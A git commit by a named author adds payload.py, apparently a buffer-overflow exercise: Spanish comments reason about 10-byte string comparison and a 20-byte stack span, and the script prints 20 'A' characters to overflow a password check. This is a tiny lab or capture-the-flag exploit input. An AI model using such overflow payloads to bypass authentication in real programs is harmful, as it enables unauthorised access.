8682534575c210a144e02f4da145a34920e20851
Victor <cuevas0122@gmail.com>
2024-03-21 01:34:36 -0600

    first commit

---
+++ payload.py
@@ -0,0 +1,6 @@
+#Las cadenas solo se comparan los primeros 
+#10 bytes de cada variable y la variable
+#password mide 10 bytes
+#Esto da una longitud de 20 bytes de pila
+output = "A" * 20
+print(output)
